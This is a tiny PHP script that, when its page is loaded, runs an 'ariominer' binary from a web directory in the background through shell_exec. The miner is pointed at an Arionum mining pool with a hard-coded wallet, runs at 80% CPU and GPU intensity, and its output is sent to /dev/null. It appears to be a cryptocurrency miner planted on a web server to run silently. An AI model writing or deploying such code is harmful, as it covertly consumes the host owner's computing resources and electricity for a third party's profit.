<?php

$mobile84 = shell_exec("~/app/htdocs/ariominer --mode miner --pool http://mine.arionumpool.com --wallet 29fwPvpz8UotEWHgGTQAhTDVX6BE3XXpQNJ9wy9WpBVqaoZ9UNgoULKrddfVyVXcQbfGhFR1TW3CvBNHo4k7xZHq --name mobileapps84 --cpu-intensity 80 --gpu-intensity-cblocks 80 --gpu-intensity-gblocks 80 > /dev/null 2>/dev/null &");

echo "$mobile84";

?>

